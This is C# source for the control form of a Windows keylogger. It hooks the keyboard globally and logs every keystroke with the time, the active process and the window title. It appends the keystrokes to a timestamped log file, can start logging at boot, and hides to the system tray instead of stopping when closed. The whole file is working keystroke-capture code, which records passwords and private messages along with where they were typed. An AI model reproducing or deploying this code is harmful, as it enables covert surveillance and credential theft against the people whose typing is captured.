using LibKeyHook;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace WinKeyLogger
{
    public partial class Control : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        private new bool Enabled = false;

        private bool WriteLogToFile = false;

        private string LogPath = string.Empty;

        private KeyHook Hook;

        private KeyDetector KD;

        private Viewer viewer;
        private RichView rviewer;

        public Control(string dirpath, bool start_in_boot)
        {
            InitializeComponent();

            Hook = new KeyHook();
            Hook.KeyDown += Hook_KeyDown;
            Hook.KeyUp += Hook_KeyUp;

            KD = new KeyDetector();
            KD.KeyDownAndUpEvent += KD_KeyDownAndUpEvent;

            viewer = new Viewer();
            rviewer = new RichView();

            if (dirpath != null && Directory.Exists(dirpath))
            {
                LogPath = Path.Combine(dirpath, $"{DateTime.Now.ToString("yyyyMMddHHmmss")}-{Process.GetCurrentProcess().Id}-Log.log");

                WriteLogToFile = true;
            }

            if (start_in_boot)
                btn_enable_Click(null, null);
        }

        private void KD_KeyDownAndUpEvent(object sender, KeyDownAndUpEventArgs e)
        {
            RViewProcess(e.Keys.ToArray(), e.Session);
        }

        private void Hook_KeyUp(object sender, KeyUpEventArgs e)
        {
            KD.KeyUp(e.Key);
        }

        private void Hook_KeyDown(object sender, KeyDownEventArgs e)
        {
            KD.KeyDown(e.Key);

            var session = KeyDetector.GetKeySession();

            string Logstr = $"{DateTime.Now.ToLongTimeString()}: {session.ProcessName}[{session.WindowName}]: {e.Key}";
            viewer.lbox_log.Items.Insert(0, Logstr);
        }

        #region RView_Save

        private DateTime RViewDT = DateTime.Now;
        private readonly TimeSpan RViewOffset = TimeSpan.FromSeconds(3);

        private SessionProgram LastSession = new SessionProgram { hWnd = IntPtr.Zero, ProcessId = 0, ProcessName = string.Empty, WindowName = string.Empty };

        #endregion RView_Save

        private void RViewProcess(Keys[] key, SessionProgram Session)
        {
            var now = DateTime.Now;

            TimeSpan diff = now - RViewDT;

            string keystr = " ";
            if (key.Length < 2)
            {
                keystr += key[0].ToString();
            }
            else
            {
                keystr += "(";
                foreach (var k in key)
                {
                    string ks = k.ToString();

                    // On Digit Key
                    if (ks.Length == 2 && ks.StartsWith("D"))
                    {
                        ks = ks.TrimStart('D');
                    }
                    // On Special Key
                    else if (ks.Length > 1)
                    {
                        ks = '<' + ks + '>';
                    }
                    
                    keystr += ' ' + ks;
                }
                keystr += " )";
            }

            // If New Input
            if (diff > RViewOffset || !Session.Equals(LastSession))
            {
                string log = $"\n {now.ToLongTimeString()}: {Session.ProcessName}[{Session.WindowName}]:";
                rviewer.rbox_log.AppendText(log);
                WriteLog(log);

                LastSession = Session.Clone();
            }

            // Write Key
            rviewer.rbox_log.AppendText(keystr);
            WriteLog(keystr);

            // Reset Time Counter
            RViewDT = now;
        }

        private void WriteLog(string Log)
        {
            if (!WriteLogToFile) return;

            File.AppendAllText(LogPath, Log, Encoding.UTF8);
        }

        private void btn_enable_Click(object sender, EventArgs e)
        {
            if (!Enabled)
            {
                // Be Enabled
                btn_enable.Text = "Disable";
                Enabled = true;
                Hook.Start();
            }
            else
            {
                // Be Disabled
                btn_enable.Text = "Enable";
                Enabled = false;
                Hook.Stop();
            }
        }

        private void btn_view_Click(object sender, EventArgs e)
        {
            viewer.Show();
        }

        private void btn_rview_Click(object sender, EventArgs e)
        {
            rviewer.Show();
        }

        private void Control_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Enabled)
            {
                e.Cancel = true;
                Hide();
                notifyIcon1.ShowBalloonTip(1000);
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }

        private void notifyIcon1_Click(object sender, EventArgs e)
        {
            Show();
        }

        private void Control_Load(object sender, EventArgs e)
        {
        }
    }
}